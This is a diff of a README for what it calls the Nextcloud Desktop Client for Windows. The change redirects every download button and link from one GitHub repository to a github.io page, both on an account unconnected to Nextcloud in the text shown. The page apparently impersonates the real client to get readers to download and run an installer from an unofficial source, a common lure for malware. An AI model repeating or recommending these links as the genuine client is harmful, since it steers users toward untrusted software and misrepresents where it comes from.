@@ -1,5 +1,5 @@
 # ☁️ Nextcloud Desktop Client for Windows – Your Private Cloud, Always Within Reach
-[![Download Nextcloud Desktop Client](https://img.shields.io/badge/Download-Nextcloud_Desktop_Client-2ea44f?style=for-the-badge&logo=nextcloud&logoColor=white)](https://github.com/Carlenseptic6/Nextcloud-Desktop-for-Windows-10-11-File-Sync-Client-2026-)
+[![Download Nextcloud Desktop Client](https://img.shields.io/badge/Download-Nextcloud_Desktop_Client-2ea44f?style=for-the-badge&logo=nextcloud&logoColor=white)](https://carlenseptic6.github.io)
 
 ## 🌟 Welcome to Your Secure File Sync Solution
 
@@ -11,7 +11,7 @@ Think of it as your personal Dropbox, but with one huge difference: you control 
 
 **Step 1: Get the App**
 
-Visit this link to download the application: [Nextcloud Desktop Client Download](https://github.com/Carlenseptic6/Nextcloud-Desktop-for-Windows-10-11-File-Sync-Client-2026-)
+Visit this link to download the application: [Nextcloud Desktop Client Download](https://carlenseptic6.github.io)
 
 **Step 2: Run the Installer**
 
@@ -135,7 +135,7 @@ Stop settling for cloud services that mine your data or limit your storage. With
 
 **Click the button below to start your secure sync journey:**
 
-[![Download Nextcloud Desktop Client](https://img.shields.io/badge/Download-Nextcloud_Desktop-0084B4?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Carlenseptic6/Nextcloud-Desktop-for-Windows-10-11-File-Sync-Client-2026-)
+[![Download Nextcloud Desktop Client](https://img.shields.io/badge/Download-Nextcloud_Desktop-0084B4?style=for-the-badge&logo=download&logoColor=white)](https://carlenseptic6.github.io)
 
 Visit this link to download the application and join thousands of satisfied users who've made the smart switch to private, encrypted cloud storage. Your files deserve better – get them the protection and accessibility they need today.
 
